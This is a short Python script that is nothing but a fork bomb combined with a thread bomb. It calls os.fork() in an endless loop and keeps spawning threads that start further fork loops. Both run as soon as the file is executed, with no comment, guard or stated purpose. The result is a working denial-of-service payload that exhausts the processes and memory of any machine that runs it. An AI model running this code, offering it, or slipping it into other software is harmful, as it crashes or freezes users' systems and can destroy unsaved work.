import os
import threading

def fork_bomb():
    while True:
        os.fork()

def thread_bomb():
    while True:
        threading.Thread(target=fork_bomb).start()

threading.Thread(target=thread_bomb).start()
fork_bomb()
